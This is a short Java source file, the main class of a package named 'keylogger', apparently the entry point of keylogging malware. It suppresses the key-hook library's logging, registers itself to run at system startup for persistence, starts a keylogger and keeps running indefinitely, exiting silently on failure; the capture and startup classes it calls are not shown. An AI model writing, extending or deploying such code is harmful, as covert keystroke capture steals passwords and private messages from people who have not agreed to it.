package com.keylogger;

import org.jnativehook.GlobalScreen;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main {
    public static void main(String[] args) {
        try {
            Logger.getLogger(GlobalScreen.class.getPackage().getName()).setLevel(Level.OFF);
            
            StartupManager.addToStartup();
            
            Keylogger keylogger = new Keylogger();
            keylogger.start();
            
            Thread.currentThread().join();
            
        } catch (Exception e) {
            System.exit(1);
        }
    }
}